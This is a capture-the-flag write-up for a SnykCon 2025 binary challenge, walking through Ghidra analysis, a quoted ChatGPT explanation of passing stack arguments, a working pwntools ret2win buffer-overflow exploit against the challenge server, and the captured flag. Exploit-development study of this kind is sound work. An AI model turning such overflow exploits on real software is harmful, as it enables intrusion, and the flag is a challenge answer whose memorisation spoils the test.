# Additional Information Needed
![image](https://github.com/user-attachments/assets/02a5055c-9d35-4f7f-b0ac-4f50e3dc234a)

Attachment: [challenge.elf](https://github.com/LazyTitan33/CTF-Writeups/raw/refs/heads/main/SnykCon2025/attachments/challenge.elf)

## Writeup

Trying to first run the binary without any modifications, to see what it does, I can see that it just tells me to make a call to the getFlag() function.  

![image](https://github.com/user-attachments/assets/8ff6a1c4-faea-45bb-986a-4b5b1e16cc98)

I throw the binary in Ghidra and see the buffer of 32 bytes in the Main function:  

![image](https://github.com/user-attachments/assets/a3b3e81c-99b9-4933-9ba6-f909eda7f816)

I can see the getFlag function simply reading the flag.txt:  

![image](https://github.com/user-attachments/assets/c907094c-8d04-4c05-b7a2-ef763fb6771c)

At first I tried a regular ret2win attack but it didn't work. I was moving fast so I consulted with chatGPT who had this to say:

```text
You're correctly overwriting the return address to call getFlag(), but the function requires two arguments, and you're not
controlling them in your exploit. Since getFlag() checks if param_1 * param_2 == 0x23 (35 in decimal), you need to control the
stack to provide appropriate values for these parameters.

Steps to Fix the Exploit:
	1. Control the arguments:
In 32-bit x86, function arguments are passed on the stack, right after the return address. So after overwriting the return
address with getFlag's address, you must push two values (param_1 and param_2) that satisfy param_1 * param_2 == 35.
	2. Choose valid parameters:
You need two integers that multiply to 35. Some possibilities:
		○ (5, 7)
		○ (7, 5)
		○ (1, 35)
		○ (35, 1)
	3. Modify your exploit:
You need to add these arguments after overwriting the return address.
```

And so I adjusted the exploit code and got this working:  

```python
from pwn import *

# Define the target binary
binary = './challenge.elf'
elf = ELF(binary)

# Connect to the remote challenge
prog = remote('challenge.ctf.games', 32258)

# Construct the payload
payload = b'A' * 40  # Overflow buffer
payload += p32(elf.symbols['getFlag'])  # Overwrite return address with getFlag
payload += p32(0x0)  # Fake return address (not necessary but aligns stack)
payload += p32(5)  # First argument (param_1)
payload += p32(7)  # Second argument (param_2)

# Send payload
prog.recvline()
prog.recvline()
prog.sendline(payload)
prog.interactive()
```

![image](https://github.com/user-attachments/assets/e4929eb3-71f4-4027-8e73-680e50ff77a0)

flag{8e9e2e4ec228db4207791e0a534716c3}

